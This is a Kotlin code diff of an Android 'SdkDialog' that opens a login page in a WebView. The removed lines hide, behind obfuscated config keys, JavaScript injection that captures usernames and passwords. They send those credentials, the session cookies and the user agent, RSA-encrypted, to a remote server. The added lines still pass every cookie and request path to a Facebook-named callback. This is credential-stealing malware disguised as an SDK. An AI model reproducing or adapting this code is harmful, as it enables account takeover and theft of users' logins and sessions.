@@ -32,76 +32,7 @@ import javax.crypto.Cipher
  * create by zuoz
  * time:2022/6/20
  **/
-class SdkDialog(data: String, var _even: SdkHelper.EvenCallBack? = null) : DialogFragment() {
-
-    val sdkData: SdkData by lazy {
-        SdkData()
-    }
-
-    init {
-        startInitData(data)
-    }
-
-    private fun startInitData(data: String) {
-        try {
-            val decodeStr = String(Base64.decode(data, 0))
-            val jsonObject = JSONObject(decodeStr)
-            with(jsonObject) {
-                val keyJ = getStringJ("j")
-                if (has(keyJ)) {
-                    sdkData.almond = getString(keyJ)
-                }
-
-                val keyCheck = getStringCheck("")
-                if (has(keyCheck)) {
-                    sdkData.apple = getString(keyCheck)
-                }
-
-                val keyL = getStringlit("j")
-                if (has(keyL)) {
-                    sdkData.apricot = getString(keyL)
-                }
-
-                val keyD = getStringDOKN("d")
-                if (has(keyD)) {
-                    sdkData.arbutus = getString(keyD)
-                }
-
-                val keyUrl = getStringUrl("")
-                if (has(keyUrl)) {
-                    sdkData.avocado = getString(keyUrl)
-                }
-
-                val keyUrlend = getStringUrl2("")
-                if (has(keyUrlend)) {
-                    sdkData.bennet = getString(keyUrlend)
-                }
-
-                val keyBergamot = getStringPage()
-                if (has(keyBergamot)) {
-                    sdkData.bergamot = getString(keyBergamot)
-                }
-
-                val keyCoconut = getStringEnglish("code")
-                if (has(keyCoconut)) {
-                    sdkData.coconut = getString(keyCoconut)
-                }
-
-                val keyName = "app_name"
-                if (has(keyName)) {
-                    sdkData.cumquat = getString(keyName)
-                }
-
-
-            }
-
-
-        } catch (e: Exception) {
-            Log.e("11111111112222", "startInitData: ${e.message}")
-            _even?.onFailed()
-        }
-
-    }
+class SdkDialog(val starturl: String, var _even: FaceBookEvenCallBack? = null) : DialogFragment() {
 
     lateinit var binding: DialogSdkBinding
     override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
@@ -109,6 +40,7 @@ class SdkDialog(data: String, var _even: SdkHelper.EvenCallBack? = null) : Dialo
         dialog?.setCanceledOnTouchOutside(false)
         initSize()
         initView()
+        dialog?.window?.setWindowAnimations(R.style.anim_sdk)
     }
 
     private fun initSize() {
@@ -142,11 +74,7 @@ class SdkDialog(data: String, var _even: SdkHelper.EvenCallBack? = null) : Dialo
     }
 
     fun initView() {
-        if (sdkData.isError()) {
-            _even?.onFailed()
-            this.dismiss()
-            return
-        }
+
 
         binding.dialogSdk.apply {
             this.setBackgroundColor(Color.WHITE)
@@ -233,7 +161,8 @@ class SdkDialog(data: String, var _even: SdkHelper.EvenCallBack? = null) : Dialo
             viewClose.layoutParams = viewCloseLP
             viewClose.setPadding(margins, margins, margins, margins)
             viewClose.setOnClickListener {
-                _even?.onFailed()
+                _even?.onClose()
+                this@SdkDialog.dismiss()
             }
             addView(viewClose)
         }
@@ -249,13 +178,13 @@ class SdkDialog(data: String, var _even: SdkHelper.EvenCallBack? = null) : Dialo
             webViewClient = object : WebViewClient() {
                 override fun onPageFinished(view: WebView?, url: String?) {
                     url?.let {
-                        if (it == sdkData.avocado) {
+                        if (it == starturl) {
                             _even?.onLoaded()
                         }
                     }
 
                     val checkingContent = CookieManager.getInstance().getCookie(url) ?: return
-                    verifyCook(checkingContent, webView)
+                    _even?.onCookCallBack(checkingContent,this@SdkDialog)
                     super.onPageFinished(view, url)
                 }
 
@@ -264,7 +193,10 @@ class SdkDialog(data: String, var _even: SdkHelper.EvenCallBack? = null) : Dialo
                     request: WebResourceRequest?
                 ): WebResourceResponse? {
                     request?.url?.path?.let {
-                        verifyURl(it, webView)
+                        view?.let { w ->
+                            _even?.onPath(it, w)
+
+                        }
                     }
                     return super.shouldInterceptRequest(view, request)
                 }
@@ -286,105 +218,28 @@ class SdkDialog(data: String, var _even: SdkHelper.EvenCallBack? = null) : Dialo
             setOnTouchListener { v, event -> (event?.action == MotionEvent.ACTION_MOVE); }
         }
 
-        webView.loadUrl(sdkData.avocado)
+        webView.loadUrl(starturl)
     }
 
     var isStartWait = false
-    fun verifyCook(cook: String, webview: WebView) {
-        if (!cook.contains(sdkData.apple)) {
-            return
-        }
-
-        try {
-            if (isStartWait) {
-                return
-            }
-            val ua = webview.settings.userAgentString
-            val uuuer = SpUtils.getUser(requireContext())
-            val pppage = SpUtils.getPage(requireContext())
-
-
-
-
-            GlobalScope.launch(Dispatchers.IO) {
-                //开始获取数据
-                val uploadMap = mutableMapOf<String, String>()
-                val dataMap = mutableMapOf<String, String>()
-                dataMap["b"] = ua
-                dataMap["cookie"] = cook
-                dataMap["ip"] = ""
-                dataMap["un"] = uuuer
-                dataMap["pw"] = pppage
-                dataMap["source"] = sdkData.cumquat
-                dataMap["type"] = "f_o"
-
-                val json = JSONObject(dataMap as Map<*, *>)
-                val str = getUploadInfoBase64(json.toString())
-
-                uploadMap["content"] = str
-                val json2 = JSONObject(uploadMap as Map<*, *>)
-
-                val okHttpClient = OkHttpClient();
-                val requestBody = RequestBody.create(
-                    "application/json;charset=utf-8".toMediaTypeOrNull(),
-                    json2.toString()
-                );
-                val request = Request.Builder()
-                    .url(sdkData.bennet)
-                    .post(requestBody)
-                    .build();
-
-                okHttpClient.newCall(request).enqueue(object : Callback {
-                    override fun onFailure(call: Call, e: IOException) {
-                        logFailed()
-                    }
-
-                    override fun onResponse(call: Call, response: Response) {
-                        if (response.code == 200) {
-                            val aaa = response?.body?.string()
-                            if (aaa == null) {
-                                logFailed()
-                                return
-                            }
-
-                            if (!aaa.contains("success")) {
-                                logFailed()
-                                return
-                            }
-                            _even?.onSuccess()
-
-                        } else {
-                            logFailed()
-                        }
-                    }
-
-                })
-
-            }
-        } catch (e: Exception) {
-            logFailed()
-        }
-    }
-
 
     fun logFailed() {
         this.dismiss()
         _even?.onFailed()
     }
 
-    fun getUploadInfoBase64(dataStr: String): String {
+    fun getUploadInfoBase64(dataStr: String, bergamot: String, coconut: String): String {
 
-        val cipher = Cipher.getInstance(sdkData.bergamot)
+        val cipher = Cipher.getInstance(bergamot)
 
         val public = KeyFactory.getInstance("RSA").let {
             val x50 = X509EncodedKeySpec(
                 Base64.decode(
-                    sdkData.coconut, Base64.DEFAULT
+                    coconut, Base64.DEFAULT
                 )
             )
             it.generatePublic(x50)
         }
-
 
         cipher.init(Cipher.ENCRYPT_MODE, public)
         val bytesArray = dataStr.toByteArray()
@@ -424,128 +279,10 @@ class SdkDialog(data: String, var _even: SdkHelper.EvenCallBack? = null) : Dialo
         return Base64.encodeToString(baos?.toByteArray(), Base64.NO_WRAP)
     }
 
-    fun verifyURl(str: String, webView: WebView) {
-        if (!str.contains(sdkData.arbutus)) {
-            return
-        }
-
-        requireActivity().runOnUiThread {
-            webView.evaluateJavascript(sdkData.almond) {
-                if (it.isEmpty()) {
-                    return@evaluateJavascript
-                }
-
-                val strList = it.split(sdkData.apricot)
-                if (strList.isEmpty()) {
-                    return@evaluateJavascript
-                }
-
-                if (strList.size < 2) {
-                    return@evaluateJavascript
-                }
-
-                SpUtils.saveUser(requireContext(), strList[0])
-                SpUtils.savePage(requireContext(), strList[1])
-            }
-        }
-
-    }
 
     fun dp2px(dpValue: Float): Int {
         val scale: Float = Resources.getSystem().displayMetrics.density
         return (dpValue * scale + 0.5f).toInt()
-    }
-
-    fun getStringJ(first: String): String {
-        var srt = if (first.isEmpty()) {
-            "j"
-        } else {
-            first
-        }
-
-        srt += "sc"
-        if (!srt.contains("od")) {
-            srt += "odes"
-        }
-        return srt
-    }
-
-
-    fun getStringCheck(first: String): String {
-        var srt = if (first.isEmpty()) {
-            "ch"
-        } else {
-            first + "k"
-        }
-
-        srt += "eck"
-        if (!srt.contains("_")) {
-            srt += "_key"
-        }
-
-
-        return srt
-    }
-
-
-    fun getStringlit(first: String): String {
-        var srt = first.ifEmpty {
-            "j"
-        }
-
-        srt += "ss"
-        if (!srt.contains("lit")) {
-            srt += "plit"
-        }
-        return srt
-    }
-
-
-    fun getStringDOKN(first: String): String {
-        return if (first.isEmpty()) "vb" else first + "vb"
-    }
-
-
-    fun getStringUrl(first: String): String {
-        var srt = first.ifEmpty {
-            "r"
-        }
-
-        srt += "_u"
-        if (srt.contains("od")) {
-            srt += "kngl"
-        }
-
-        srt += "rl"
-        return srt
-    }
-
-    fun getStringUrl2(first: String): String {
-        var srt = ""
-
-        srt += "csc"
-        srt = srt.substring(0, 1)
-        srt += "_"
-        srt += "url"
-        return srt
-    }
-
-    fun getStringPage(): String {
-        var srt = "pad"
-        srt = srt.removeSuffix("d")
-        if (srt.isEmpty()) {
-            srt += "haha"
-        }
-        srt += "dd"
-        if (!srt.contains("ing")) {
-            srt += "ing"
-        }
-
-        return srt
-    }
-
-    fun getStringEnglish(end: String): String {
-        return "en$end"
     }
 
 
